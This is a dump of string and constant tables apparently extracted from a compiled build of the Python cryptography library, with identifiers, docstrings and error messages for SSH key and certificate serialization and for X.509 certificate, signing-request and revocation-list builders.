private key from data.apublic_numbersaput_mpintwewnuWrite RSA public keyaprivate_numberswdaiqmpwpwquWrite RSA private keyuDSA public fieldsutoo many values to unpack (expected 4)aDSAParameterNumbersaDSAPublicNumbersa_validateuMake DSA public key from data.uCorrupt data: dsa field mismatchaDSAPrivateNumbersuMake DSA private key from data.aparameter_numberswgwyuWrite DSA public keyaencode_publicwxuWrite DSA private keyluSSH supports only 1024 bit DSA keysassh_curve_nameuCurve name mismatchluNeed uncompressed pointuECDSA public fieldsafrom_encoded_pointuMake ECDSA public key from data.uCorrupt data: ecdsa field mismatchaderive_private_keyuMake ECDSA private key from data.apublic_bytesaEncodingaX962aPublicFormataUncompressedPointuWrite ECDSA public keyaprivate_valueuWrite ECDSA private keyuEd25519 public fieldsutoo many values to unpack (expected 1)afrom_public_bytesuMake Ed25519 public key from data.:nl n:l nnuCorrupt data: ed25519 field mismatchafrom_private_bytesuMake Ed25519 private key from data.aRawuWrite Ed25519 public keyaprivate_bytesaPrivateFormataNoEncryptiona_FragListuWrite Ed25519 private keyastartswithTcssh:uU2F application string does not start with b'ssh:' (w)u
    U2F application strings
    a_lookup_kformataload_publicaload_applicationa_ECDSA_NISTP256a_KEY_FORMATSuUnsupported key type: uReturn valid format or throw errora_check_byteslikeadataa_check_bytesapassworda_PEM_RCasearchuNot OpenSSH private key formatastartTlaendabinasciiaa2b_base64a_SK_MAGICluOnly one key supporteda_check_emptya_NONEuUnsupported cipher: a_BCRYPTuUnsupported KDF: ablock_lenatag_lenais_aeaduCorrupt data: invalid tag length for ciphera_check_block_sizea_init_cipheradecryptoraupdateaAEADDecryptionContextafinalize_with_tagatagafinalizeaedatauCorrupt data: broken checksumuCorrupt data: key type mismatchaload_privatea_PADDINGuCorrupt data: invalid paddingawarningsawarnuSSH DSA keys are deprecated and will be removed in a future release.aDeprecatedIn40DastacklevelluLoad private key from OpenSSH custom encoding.uSSH DSA key support is deprecated and will be removed in a future releaseDastacklevella_get_ssh_key_typea_DEFAULT_CIPHERa_DEFAULT_ROUNDSa_KeySerializationEncryptiona_kdf_roundsaurandomTlTlaencode_privateTcaput_rawaciphernameaencryptoraupdate_intoa_ssh_pem_encodeuSerialize private key with OpenSSH custom encoding.a_noncea_public_keya_serialaSSHCertificateTypea_typeuInvalid certificate typea_key_ida_valid_principalsa_valid_aftera_valid_beforea_critical_optionsa_extensionsa_sig_typea_sig_keya_inner_sig_typea_signaturea_cert_key_typea_cert_bodya_tbs_cert_bodyacastaSSHCertPublicKeyTypesd ab2a_base64DanewlineFasignature_keyaverifyaasym_utilsaencode_dss_signaturea_get_ec_hash_algaECDSAahashesaSHA1a_SSH_RSA_SHA256aSHA256a_SSH_RSA_SHA512aSHA512apaddingaPKCS1v15aSECP256R1aSECP384R1aSHA384aSECP521R1a_SSH_PUBKEY_RCamatchuInvalid line formatagroupTlaendswitha_CERT_SUFFIXakey_typeTuDSA keys aren't supported in SSH certificatesaErroruInvalid formatuInvalid key formata_get_u64aprincipalsavalid_principalsa_parse_exts_optsTuDSA signatures aren't supported in SSH certificatesacert_bodyuSignature key type does not matchaSSHCertificateanoncea_load_ssh_public_identityaexts_optsaresultuDuplicate namealast_nameuFields not lexically sorteduUnexpected extra data after valueavalueDa_legacy_dsa_allowedtastripuOne-line public key format for OpenSSHa_valid_for_all_principalsupublic_key already setaSSHCertificateBuilderT
a_public_keya_seriala_typea_key_ida_valid_principalsa_valid_for_all_principalsa_valid_beforea_valid_aftera_critical_optionsa_extensionsuserial must be an integerguserial must be between 0 and 2**64userial already setutype must be an SSHCertificateTypeutype already setukey_id must be bytesukey_id already setuPrincipals can't be set because the cert is valid for all principalsuprincipals must be a list of bytes and can't be emptyuvalid_principals already seta_SSHKEY_CERT_MAX_PRINCIPALSuReached or exceeded the maximum number of valid_principalsu<genexpr>uSSHCertificateBuilder.valid_principals.<locals>.<genexpr>uvalid_principals already set, can't set valid_for_all_principalsuvalid_for_all_principals already setTOintOfloatuvalid_before must be an int or floatuvalid_before must [0, 2**64)uvalid_before already setuvalid_after must be an int or floatuvalid_after must [0, 2**64)uvalid_after already setuname and value must be bytesuDuplicate critical option nameuDuplicate extension nameuUnsupported private key typeupublic_key must be setutype must be setuvalid_principals must be set if valid_for_all_principals is Falseuvalid_before must be setuvalid_after must be setuvalid_after must be earlier than valid_beforeasortu<lambda>uSSHCertificateBuilder.sign.<locals>.<lambda>TakeyTl aput_u64afprincipalsafcritafextasignadecode_dss_signatureaload_ssh_public_identitya__doc__a__file__a__spec__aoriginahas_locationa__cached__a__annotations__aannotationsaenumaosareatypingabase64TaencodebytesaencodebytesadataclassesTadataclassadataclassacryptographyTautilsucryptography.exceptionsTaUnsupportedAlgorithmucryptography.hazmat.primitivesTahashesucryptography.hazmat.primitives.asymmetricTadsaaecaed25519apaddingarsaucryptography.hazmat.primitives.ciphersTaAEADDecryptionContextaCipheraalgorithmsamodesaalgorithmsamodesucryptography.hazmat.primitives.serializationTaEncodingaKeySerializationEncryptionaNoEncryptionaPrivateFormataPublicFormata_KeySerializationEncryptionaKeySerializationEncryptionabcryptTakdfakdfa_bcrypt_supportedTFDapasswordasaltadesired_key_bytesaroundsaignore_few_roundsareturnabytespaintpaboolabytescssh-ed25519cssh-rsacssh-dsscecdsa-sha2-nistp256cecdsa-sha2-nistp384a_ECDSA_NISTP384cecdsa-sha2-nistp521a_ECDSA_NISTP521c-cert-v01@openssh.comcsk-ssh-ed25519@openssh.coma_SK_SSH_ED25519csk-ecdsa-sha2-nistp256@openssh.coma_SK_SSH_ECDSA_NISTP256crsa-sha2-256crsa-sha2-512acompileTc\A(\S+)[ \t]+(\S+)bopenssh-key-v1c-----BEGIN OPENSSH PRIVATE KEY-----a_SK_STARTc-----END OPENSSH PRIVATE KEY-----a_SK_ENDcbcryptcnonecaes256-ctrlc(.*?)aDOTALLB

ucryptography.hazmat.primitives.serialization.ssha__module__a_SSHCiphera__qualname__utype[algorithms.AES]aintutype[modes.CTR] | type[modes.CBC] | type[modes.GCM]uint | NoneaboolaAESl aCTRTaalgakey_lenamodeablock_lenaiv_lenatag_lenais_aeadcaes256-cbcaCBCcaes256-gcm@openssh.comaGCMludict[bytes, _SSHCipher]asecp256r1asecp384r1asecp521r1DakeyareturnuSSHPrivateKeyTypes | SSHPublicKeyTypesabytesDapublic_keyareturnuec.EllipticCurvePublicKeyabytesd
DadataaprefixasuffixareturnabytespppDadataablock_lenareturnabytesaintaNoneDadataareturnabytesaNoneDaciphernameapasswordasaltaroundsareturnabytesubytes | NoneabytesaintuCipher[modes.CBC | modes.CTR | modes.GCM]Dadataareturnamemoryviewutuple[int, memoryview]Dadataareturnamemoryviewutuple[memoryview, memoryview]DavalareturnaintabytesuBuild recursive structure without data copy.ulist[bytes]TnDainitareturnulist[bytes] | NoneaNonea__init__u_FragList.__init__DavalareturnabytesaNoneu_FragList.put_rawDavalareturnaintaNoneu_FragList.put_u32u_FragList.put_u64Davalareturnubytes | _FragListaNoneu_FragList.put_sshstru_FragList.put_mpintDareturnaintu_FragList.sizeTlDadstbufaposareturnamemoryviewaintpu_FragList.renderDareturnabytesu_FragList.tobytesuFormat for RSA keys.

    Public:
        mpint e, n
    Private:
        mpint n, e, d, iqmp, p, q
    a_SSHFormatRSADadataareturnamemoryviewutuple[tuple[int, int], memoryview]u_SSHFormatRSA.get_publicDadataareturnamemoryviewutuple[rsa.RSAPublicKey, memoryview]u_SSHFormatRSA.load_publicDadataareturnamemoryviewutuple[rsa.RSAPrivateKey, memoryview]u_SSHFormatRSA.load_privateDapublic_keyaf_pubareturnursa.RSAPublicKeya_FragListaNoneu_SSHFormatRSA.encode_publicDaprivate_keyaf_privareturnursa.RSAPrivateKeya_FragListaNoneu_SSHFormatRSA.encode_privateuFormat for DSA keys.

    Public:
        mpint p, q, g, y
    Private:
        mpint p, q, g, y, x
    a_SSHFormatDSADadataareturnamemoryviewutuple[tuple, memoryview]u_SSHFormatDSA.get_publicDadataareturnamemoryviewutuple[dsa.DSAPublicKey, memoryview]u_SSHFormatDSA.load_publicDadataareturnamemoryviewutuple[dsa.DSAPrivateKey, memoryview]u_SSHFormatDSA.load_privateDapublic_keyaf_pubareturnudsa.DSAPublicKeya_FragListaNoneu_SSHFormatDSA.encode_publicDaprivate_keyaf_privareturnudsa.DSAPrivateKeya_FragListaNoneu_SSHFormatDSA.encode_privateDapublic_numbersareturnudsa.DSAPublicNumbersaNoneu_SSHFormatDSA._validateuFormat for ECDSA keys.

    Public:
        str curve
        bytes point
    Private:
        str curve
        bytes point
        mpint secret
    a_SSHFormatECDSADassh_curve_nameacurveabytesuec.EllipticCurveu_SSHFormatECDSA.__init__Dadataareturnamemoryviewutuple[tuple[memoryview, memoryview], memoryview]u_SSHFormatECDSA.get_publicDadataareturnamemoryviewutuple[ec.EllipticCurvePublicKey, memoryview]u_SSHFormatECDSA.load_publicDadataareturnamemoryviewutuple[ec.EllipticCurvePrivateKey, memoryview]u_SSHFormatECDSA.load_privateDapublic_keyaf_pubareturnuec.EllipticCurvePublicKeya_FragListaNoneu_SSHFormatECDSA.encode_publicDaprivate_keyaf_privareturnuec.EllipticCurvePrivateKeya_FragListaNoneu_SSHFormatECDSA.encode_privateuFormat for Ed25519 keys.

    Public:
        bytes point
    Private:
        bytes point
        bytes secret_and_point
    a_SSHFormatEd25519Dadataareturnamemoryviewutuple[tuple[memoryview], memoryview]u_SSHFormatEd25519.get_publicDadataareturnamemoryviewutuple[ed25519.Ed25519PublicKey, memoryview]u_SSHFormatEd25519.load_publicDadataareturnamemoryviewutuple[ed25519.Ed25519PrivateKey, memoryview]u_SSHFormatEd25519.load_privateDapublic_keyaf_pubareturnued25519.Ed25519PublicKeya_FragListaNoneu_SSHFormatEd25519.encode_publicDaprivate_keyaf_privareturnued25519.Ed25519PrivateKeya_FragListaNoneu_SSHFormatEd25519.encode_privateDareturnutuple[memoryview, memoryview]u
    The format of a sk-ssh-ed25519@openssh.com public key is:

        string"sk-ssh-ed25519@openssh.com"
        stringpublic key
        stringapplication (user-specified, but typically "ssh:")
    a_SSHFormatSKEd25519u_SSHFormatSKEd25519.load_publicu
    The format of a sk-ecdsa-sha2-nistp256@openssh.com public key is:

        string"sk-ecdsa-sha2-nistp256@openssh.com"
        stringcurve name
        ec_pointQ
        stringapplication (user-specified, but typically "ssh:")
    a_SSHFormatSKECDSAu_SSHFormatSKECDSA.load_publiccnistp256cnistp384cnistp521Dakey_typeabytesaUnionaSSHPrivateKeyTypesDadataapasswordabackendareturnabytesubytes | Noneutyping.AnyaSSHPrivateKeyTypesaload_ssh_private_keyDaprivate_keyapasswordaencryption_algorithmareturnaSSHPrivateKeyTypesabytesaKeySerializationEncryptionabytesa_serialize_ssh_private_keyaSSHPublicKeyTypesaEnuma__prepare__a__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>aUSERlaHOSTa__orig_bases__Da_noncea_public_keya_seriala_cctypea_key_ida_valid_principalsa_valid_aftera_valid_beforea_critical_optionsa_extensionsa_sig_typea_sig_keya_inner_sig_typea_signaturea_tbs_cert_bodya_cert_key_typea_cert_bodyamemoryviewaSSHPublicKeyTypesaintpamemoryviewulist[bytes]aintpudict[bytes, bytes]udict[bytes, bytes]amemoryviewppppabytesamemoryviewuSSHCertificate.__init__uSSHCertificate.nonceDareturnaSSHCertPublicKeyTypesuSSHCertificate.public_keyaserialuSSHCertificate.serialDareturnaSSHCertificateTypeatypeuSSHCertificate.typeakey_iduSSHCertificate.key_idDareturnulist[bytes]uSSHCertificate.valid_principalsavalid_beforeuSSHCertificate.valid_beforeavalid_afteruSSHCertificate.valid_afterDareturnudict[bytes, bytes]acritical_optionsuSSHCertificate.critical_optionsaextensionsuSSHCertificate.extensionsuSSHCertificate.signature_keyuSSHCertificate.public_bytesDareturnaNoneaverify_cert_signatureuSSHCertificate.verify_cert_signatureDacurveareturnuec.EllipticCurveuhashes.HashAlgorithmDadataareturnabytesuSSHCertificate | SSHPublicKeyTypesDaexts_optsareturnamemoryviewudict[bytes, bytes]Dadataabackendareturnabytesutyping.AnyaSSHPublicKeyTypesaload_ssh_public_keyDapublic_keyareturnaSSHPublicKeyTypesabytesaserialize_ssh_public_keyaSSHCertPrivateKeyTypeslD
a_public_keya_seriala_typea_key_ida_valid_principalsa_valid_for_all_principalsa_valid_beforea_valid_aftera_critical_optionsa_extensionsuSSHCertPublicKeyTypes | Noneuint | NoneuSSHCertificateType | Noneubytes | Noneulist[bytes]abooluint | Noneuint | Noneulist[tuple[bytes, bytes]]ulist[tuple[bytes, bytes]]uSSHCertificateBuilder.__init__Dapublic_keyareturnaSSHCertPublicKeyTypesaSSHCertificateBuilderuSSHCertificateBuilder.public_keyDaserialareturnaintaSSHCertificateBuilderuSSHCertificateBuilder.serialDatypeareturnaSSHCertificateTypeaSSHCertificateBuilderuSSHCertificateBuilder.typeDakey_idareturnabytesaSSHCertificateBuilderuSSHCertificateBuilder.key_idDavalid_principalsareturnulist[bytes]aSSHCertificateBuilderuSSHCertificateBuilder.valid_principalsavalid_for_all_principalsuSSHCertificateBuilder.valid_for_all_principalsDavalid_beforeareturnuint | floataSSHCertificateBuilderuSSHCertificateBuilder.valid_beforeDavalid_afterareturnuint | floataSSHCertificateBuilderuSSHCertificateBuilder.valid_afterDanameavalueareturnabytespaSSHCertificateBuilderaadd_critical_optionuSSHCertificateBuilder.add_critical_optionaadd_extensionuSSHCertificateBuilder.add_extensionDaprivate_keyareturnaSSHCertPrivateKeyTypesaSSHCertificateuSSHCertificateBuilder.signucryptography\hazmat\primitives\serialization\ssh.pyTa.0wxTwxu<module cryptography.hazmat.primitives.serialization.ssh>Ta__class__Taselfa_noncea_public_keya_seriala_cctypea_key_ida_valid_principalsa_valid_aftera_valid_beforea_critical_optionsa_extensionsa_sig_typea_sig_keya_inner_sig_typea_signaturea_tbs_cert_bodya_cert_key_typea_cert_bodyTaselfa_public_keya_seriala_typea_key_ida_valid_principalsa_valid_for_all_principalsa_valid_beforea_valid_aftera_critical_optionsa_extensionsTaselfainitTaselfassh_curve_nameacurveTapasswordasaltadesired_key_bytesaroundsaignore_few_roundsTadataablock_lenTadataTapublic_keyacurveTacurveTadataavalTakeyakey_typeTadatawnTaciphernameapasswordasaltaroundsaciphaseedT"adataa_legacy_dsa_allowedwmakey_typeaorig_key_typeakey_bodyawith_certakformatarestacert_bodyainner_key_typeanonceapublic_keyaserialacctypeakey_idaprincipalsavalid_principalsaprincipalavalid_afteravalid_beforeacrit_optionsacritical_optionsaextsaextensionsw_asig_key_rawasig_typeasig_keyatbs_cert_bodyasignature_rawainner_sig_typeasig_restasignatureTakey_typeTaexts_optsaresultabnamealast_nameanameavalueaextraTaprivate_keyapasswordaencryption_algorithmakey_typeakformataf_kdfoptionsaciphernameablklenakdfnamearoundsasaltaciphankeysacheckvalacommentaf_public_keyaf_secretsaf_mainaslenamlenabufaofsTadataaprefixasuffixTavalanbytesTaselfapublic_numbersaparameter_numbersTaselfanameavalueTaselfTaselfaprivate_keyaf_privTaselfaprivate_keyaf_privapublic_keyaprivate_numbersTaselfaprivate_keyaf_privapublic_keyaraw_private_keyaraw_public_keyaf_keypairTaselfaprivate_keyaf_privaprivate_numbersapublic_numbersTaselfapublic_keyaf_pubapublic_numbersaparameter_numbersTaselfapublic_keyaf_pubapointTaselfapublic_keyaf_pubaraw_public_keyTaselfapublic_keyaf_pubapubnTaselfadatawpwqwgwyTaselfadataacurveapointTaselfadataapointTaselfadatawewnTaselfakey_idTadataaapplicationTaselfadataapubfieldswpwqwgwywxaparameter_numbersapublic_numbersaprivate_numbersaprivate_keyTaselfadataapubfieldsacurve_nameapointasecretaprivate_keyTaselfadataapubfieldsapointakeypairasecretapoint2aprivate_keyTaselfadataapubfieldswnwewdaiqmpwpwqadmp1admq1apublic_numbersaprivate_numbersaprivate_keyTaselfadatawpwqwgwyaparameter_numbersapublic_numbersapublic_keyTaselfadataw_apointapublic_keyTaselfadataapointapublic_keyTaselfadatawewnapublic_numbersapublic_keyTaselfadataapublic_keyw_Tadataapasswordabackendwmap1ap2aciphernameakdfnameakdfoptionsankeysapubdataapub_key_typeakformatapubfieldsaciphername_bytesablklenatag_lenaedataatagasaltakbufaroundsaciphadecack1ack2akey_typeaprivate_keyw_Tadataabackendapublic_keyacert_or_keyTaselfapublic_keyTaselfavalTaselfadstbufaposafragaflenastartTaselfaserialTapublic_keyakey_typeakformataf_pubapubTaselfaprivate_keyaserialakey_idakey_typeacert_prefixanonceakformatwfafprincipalswpafcritanameavalueafoptvalafextafextvalaca_typeacaformatacafasignatureafsigahash_algwrwsafsigblobacert_dataTaselfasigformatasignature_keyasigkey_restTaselfabufTaselfatypeTaselfavalid_afterTaselfavalid_beforeTaselfavalid_principalsTaselfasignature_keywradatawsacomputed_sigahash_alg.cryptography.utils,suu must be bytesu must be bytes-likelulength argument can't be 0ato_bytesabit_lengthlllabigavalueamessageawarning_classa__class__a__init__a__name__a_modulea_DeprecatedValueawarningsawarnDastacklevelladelattrTa_moduleamodulesa_ModuleWithDeprecationsa_cached_Dainstanceaobjectainnerucached_property.<locals>.inneracached_nameasentinelafuncw<w.a_name_u: a_value_w>a__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsaenumasysatypesatypingaUserWarninga__prepare__aCryptographyDeprecationWarninga__getitem__u%s.__prepare__() must return a mapping, not %su<metaclass>ucryptography.utilsa__module__a__qualname__a__orig_bases__aDeprecatedIn36aDeprecatedIn37aDeprecatedIn40aDeprecatedIn41aDeprecatedIn42aDeprecatedIn43DanameavalueareturnastrabytesaNonea_check_bytesa_check_byteslikeTnDaintegeralengthareturnaintuint | Noneabytesaint_to_bytesTEExceptionaInterfaceNotImplementedDavalueamessageaobjectastru_DeprecatedValue.__init__aModuleTypeDamoduleutypes.ModuleTypeu_ModuleWithDeprecations.__init__Daattrareturnastraobjecta__getattr__u_ModuleWithDeprecations.__getattr__DaattravalueareturnastraobjectaNonea__setattr__u_ModuleWithDeprecations.__setattr__DaattrareturnastraNonea__delattr__u_ModuleWithDeprecations.__delattr__Dareturnutyping.Sequence[str]a__dir__u_ModuleWithDeprecations.__dir__Davalueamodule_nameamessageawarning_classanameareturnaobjectastrputype[Warning]ustr | Nonea_DeprecatedValueadeprecatedDafuncareturnutyping.Callableapropertyacached_propertyaEnumDareturnastra__repr__uEnum.__repr__a__str__uEnum.__str__ucryptography\utils.pyu<module cryptography.utils>Ta__class__TaselfaattraobjTaselfTaselfavalueamessageawarning_classTaselfamodulea__class__TaselfaattravalueTanameavalueTafuncacached_nameasentinelainnerTavalueamodule_nameamessageawarning_classanameamoduleadvTainstanceacachearesultacached_nameasentinelafuncTacached_nameafuncasentinelTaintegeralength.cryptography.x509.basezIa__class__a__init__aoidaextensionuThis extension has already been set.utoo many values to unpack (expected 3)uThis attribute has already been set.atzinfoautcoffsetadatetimeatimedeltaareplaceTnTatzinfouNormalizes a datetime to a naive datetime in UTC.

    time -- datetime to normalize. Assumed to be in UTC if not timezone
            aware.
    a_oida_valuea_typeu<Attribute(oid=uu, value=avalueu)>aAttributea_attributesu<Attributes(aAttributeNotFounduNo u attribute was foundaparsed_versiona_serial_numbera_revocation_datea_extensionsawarningsawarnuProperties that return a naïve datetime object have been deprecated. Please switch to revocation_date_utc.autilsaDeprecatedIn42Dastacklevellatimezoneautca_subject_nameu
        Creates an empty X.509 certificate request (v1).
        aNameuExpecting x509.Name object.uThe subject name may only be set once.aCertificateSigningRequestBuilderu
        Sets the certificate requestor's distinguished name.
        aExtensionTypeuextension must be an ExtensionTypeaExtensiona_reject_duplicate_extensionu
        Adds an X.509 extension to the certificate request.
        aObjectIdentifieruoid must be an ObjectIdentifieruvalue must be bytesa_ASN1Typeutag must be _ASN1Typea_reject_duplicate_attributeu
        Adds an X.509 attribute with an OID and associated value.
        uA CertificateSigningRequest must have a subjectapaddingaPSSaPKCS1v15uPadding must be PSS or PKCS1v15arsaaRSAPrivateKeyuPadding is only supported for RSA keysarust_x509acreate_x509_csru
        Signs the request using the requestor's private key.
        aVersionav3a_versiona_issuer_namea_public_keya_not_valid_beforea_not_valid_afteruThe issuer name may only be set once.aCertificateBuilderu
        Sets the CA's distinguished name.
        u
        Sets the requestor's distinguished name.
        adsaaDSAPublicKeyaRSAPublicKeyaecaEllipticCurvePublicKeyaed25519aEd25519PublicKeyaed448aEd448PublicKeyax25519aX25519PublicKeyax448aX448PublicKeyuExpecting one of DSAPublicKey, RSAPublicKey, EllipticCurvePublicKey, Ed25519PublicKey, Ed448PublicKey, X25519PublicKey, or X448PublicKey.uThe public key may only be set once.u
        Sets the requestor's public key (as found in the signing request).
        uSerial number must be of integral type.uThe serial number may only be set once.luThe serial number should be positive.abit_lengthluThe serial number should not be more than 159 bits.u
        Sets the certificate serial number.
        uExpecting datetime object.uThe not valid before may only be set once.a_convert_to_naive_utc_timea_EARLIEST_UTC_TIMEuThe not valid before date must be on or after 1950 January 1).uThe not valid before date must be before the not valid after date.u
        Sets the certificate activation time.
        uThe not valid after may only be set once.uThe not valid after date must be on or after 1950 January 1.uThe not valid after date must be after the not valid before date.u
        Sets the certificate expiration time.
        u
        Adds an X.509 extension to the certificate.
        uA certificate must have a subject nameuA certificate must have an issuer nameuA certificate must have a serial numberuA certificate must have a not valid before timeuA certificate must have a not valid after timeuA certificate must have a public keyacreate_x509_certificateu
        Signs the certificate using the CA's private key.
        a_last_updatea_next_updatea_revoked_certificatesaCertificateRevocationListBuilderuLast update may only be set once.uThe last update date must be on or after 1950 January 1.uThe last update date must be before the next update date.uThe next update date must be after the last update date.u
        Adds an X.509 extension to the certificate revocation list.
        aRevokedCertificateuMust be an instance of RevokedCertificateu
        Adds a revoked certificate to the CRL.
        uA CRL must have an issuer nameuA CRL must have a last update timeuA CRL must have a next update timeacreate_x509_crluThe serial number should be positiveaRevokedCertificateBuilderuThe revocation date may only be set once.uThe revocation date must be on or after 1950 January 1.uA revoked certificate must have a serial numberuA revoked certificate must have a revocation datea_RawRevokedCertificateaExtensionsafrom_bytesaurandomTlabigla__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsaabcaosatypingacryptographyTautilsucryptography.hazmat.bindings._rustTax509ax509ucryptography.hazmat.primitivesTahashesaserializationahashesaserializationucryptography.hazmat.primitives.asymmetricTadsaaecaed448aed25519apaddingarsaax448ax25519ucryptography.hazmat.primitives.asymmetric.typesTaCertificateIssuerPrivateKeyTypesaCertificateIssuerPublicKeyTypesaCertificatePublicKeyTypesaCertificateIssuerPrivateKeyTypesaCertificateIssuerPublicKeyTypesaCertificatePublicKeyTypesucryptography.x509.extensionsTaExtensionaExtensionsaExtensionTypea_make_sequence_methodsa_make_sequence_methodsucryptography.x509.nameTaNamea_ASN1Typeucryptography.x509.oidTaObjectIdentifierTllpaUnionaSHA224aSHA256aSHA384aSHA512aSHA3_224aSHA3_256aSHA3_384aSHA3_512a_AllowedHashTypesTEExceptiona__prepare__a__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>ucryptography.x509.basea__module__a__qualname__DamsgaoidareturnastraObjectIdentifieraNoneuAttributeNotFound.__init__a__orig_bases__DaextensionaextensionsareturnuExtension[ExtensionType]ulist[Extension[ExtensionType]]aNoneDaoidaattributesareturnaObjectIdentifierulist[tuple[ObjectIdentifier, bytes, int | None]]aNoneDatimeareturnudatetime.datetimeudatetime.datetimeaUTF8StringDaoidavaluea_typeareturnaObjectIdentifierabytesaintaNoneuAttribute.__init__DareturnaObjectIdentifieruAttribute.oidDareturnabytesuAttribute.valueDareturnastra__repr__uAttribute.__repr__Daotherareturnaobjectaboola__eq__uAttribute.__eq__Dareturnainta__hash__uAttribute.__hash__aAttributesDaattributesareturnutyping.Iterable[Attribute]aNoneuAttributes.__init__Ta_attributesa__len__a__iter__uAttributes.__repr__DaoidareturnaObjectIdentifieraAttributeaget_attribute_for_oiduAttributes.get_attribute_for_oidaEnumav1laInvalidVersionDamsgaparsed_versionareturnastraintaNoneuInvalidVersion.__init__ametaclassaABCMetaTaCertificateTaCertificateaabstractmethodDaalgorithmareturnuhashes.HashAlgorithmabytesu
        Returns bytes using digest passed.
        afingerprintuCertificate.fingerprintapropertyu
        Returns certificate serial number
        aserial_numberuCertificate.serial_numberDareturnaVersionu
        Returns the certificate version
        aversionuCertificate.versionDareturnaCertificatePublicKeyTypesu
        Returns the public key
        apublic_keyuCertificate.public_keyu
        Returns the ObjectIdentifier of the public key.
        apublic_key_algorithm_oiduCertificate.public_key_algorithm_oidDareturnudatetime.datetimeu
        Not before time (represented as UTC datetime)
        anot_valid_beforeuCertificate.not_valid_beforeu
        Not before time (represented as a non-naive UTC datetime)
        anot_valid_before_utcuCertificate.not_valid_before_utcu
        Not after time (represented as UTC datetime)
        anot_valid_afteruCertificate.not_valid_afteru
        Not after time (represented as a non-naive UTC datetime)
        anot_valid_after_utcuCertificate.not_valid_after_utcDareturnaNameu
        Returns the issuer name object.
        aissueruCertificate.issueru
        Returns the subject name object.
        asubjectuCertificate.subjectDareturnuhashes.HashAlgorithm | Noneu
        Returns a HashAlgorithm corresponding to the type of the digest signed
        in the certificate.
        asignature_hash_algorithmuCertificate.signature_hash_algorithmu
        Returns the ObjectIdentifier of the signature algorithm.
        asignature_algorithm_oiduCertificate.signature_algorithm_oidDareturnuNone | padding.PSS | padding.PKCS1v15 | ec.ECDSAu
        Returns the signature algorithm parameters.
        asignature_algorithm_parametersuCertificate.signature_algorithm_parametersDareturnaExtensionsu
        Returns an Extensions object.
        aextensionsuCertificate.extensionsu
        Returns the signature bytes.
        asignatureuCertificate.signatureu
        Returns the tbsCertificate payload bytes as defined in RFC 5280.
        atbs_certificate_bytesuCertificate.tbs_certificate_bytesu
        Returns the tbsCertificate payload bytes with the SCT list extension
        stripped.
        atbs_precertificate_bytesuCertificate.tbs_precertificate_bytesu
        Checks equality.
        uCertificate.__eq__u
        Computes a hash.
        uCertificate.__hash__Daencodingareturnuserialization.Encodingabytesu
        Serializes the certificate to PEM or DER format.
        apublic_bytesuCertificate.public_bytesDaissuerareturnaCertificateaNoneu
        This method verifies that certificate issuer name matches the
        issuer subject name and that the certificate is signed by the
        issuer's private key. No other validation is performed.
        averify_directly_issued_byuCertificate.verify_directly_issued_byaregisterTaRevokedCertificateTu
        Returns the serial number of the revoked certificate.
        uRevokedCertificate.serial_numberu
        Returns the date of when this certificate was revoked.
        arevocation_dateuRevokedCertificate.revocation_dateu
        Returns the date of when this certificate was revoked as a non-naive
        UTC datetime.
        arevocation_date_utcuRevokedCertificate.revocation_date_utcu
        Returns an Extensions object containing a list of Revoked extensions.
        uRevokedCertificate.extensionsDaserial_numberarevocation_dateaextensionsaintudatetime.datetimeaExtensionsu_RawRevokedCertificate.__init__u_RawRevokedCertificate.serial_numberu_RawRevokedCertificate.revocation_dateu_RawRevokedCertificate.revocation_date_utcu_RawRevokedCertificate.extensionsTaCertificateRevocationListTaCertificateRevocationListu
        Serializes the CRL to PEM or DER format.
        uCertificateRevocationList.public_bytesuCertificateRevocationList.fingerprintDaserial_numberareturnaintuRevokedCertificate | Noneu
        Returns an instance of RevokedCertificate or None if the serial_number
        is not in the CRL.
        aget_revoked_certificate_by_serial_numberuCertificateRevocationList.get_revoked_certificate_by_serial_numberuCertificateRevocationList.signature_hash_algorithmuCertificateRevocationList.signature_algorithm_oiduCertificateRevocationList.signature_algorithm_parametersu
        Returns the X509Name with the issuer of this CRL.
        uCertificateRevocationList.issuerDareturnudatetime.datetime | Noneu
        Returns the date of next update for this CRL.
        anext_updateuCertificateRevocationList.next_updateu
        Returns the date of next update for this CRL as a non-naive UTC
        datetime.
        anext_update_utcuCertificateRevocationList.next_update_utcu
        Returns the date of last update for this CRL.
        alast_updateuCertificateRevocationList.last_updateu
        Returns the date of last update for this CRL as a non-naive UTC
        datetime.
        alast_update_utcuCertificateRevocationList.last_update_utcu
        Returns an Extensions object containing a list of CRL extensions.
        uCertificateRevocationList.extensionsuCertificateRevocationList.signatureu
        Returns the tbsCertList payload bytes as defined in RFC 5280.
        atbs_certlist_bytesuCertificateRevocationList.tbs_certlist_bytesuCertificateRevocationList.__eq__u
        Number of revoked certificates in the CRL.
        uCertificateRevocationList.__len__aoverloadDaidxareturnaintaRevokedCertificateuCertificateRevocationList.__getitem__Daidxareturnasliceulist[RevokedCertificate]Daidxareturnuint | sliceuRevokedCertificate | list[RevokedCertificate]u
        Returns a revoked certificate (or slice of revoked certificates).
        Dareturnutyping.Iterator[RevokedCertificate]u
        Iterator over the revoked certificates
        uCertificateRevocationList.__iter__Dapublic_keyareturnaCertificateIssuerPublicKeyTypesaboolu
        Verifies signature of revocation list against given public key.
        ais_signature_validuCertificateRevocationList.is_signature_validTaCertificateSigningRequestTaCertificateSigningRequestuCertificateSigningRequest.__eq__uCertificateSigningRequest.__hash__uCertificateSigningRequest.public_keyuCertificateSigningRequest.subjectuCertificateSigningRequest.signature_hash_algorithmuCertificateSigningRequest.signature_algorithm_oiduCertificateSigningRequest.signature_algorithm_parametersu
        Returns the extensions in the signing request.
        uCertificateSigningRequest.extensionsDareturnaAttributesu
        Returns an Attributes object.
        aattributesuCertificateSigningRequest.attributesu
        Encodes the request to PEM or DER format.
        uCertificateSigningRequest.public_bytesuCertificateSigningRequest.signatureu
        Returns the PKCS#10 CertificationRequestInfo bytes as defined in RFC
        2986.
        atbs_certrequest_bytesuCertificateSigningRequest.tbs_certrequest_bytesDareturnaboolu
        Verifies signature of signing request.
        uCertificateSigningRequest.is_signature_validDaoidareturnaObjectIdentifierabytesu
        Get the attribute value for a given OID.
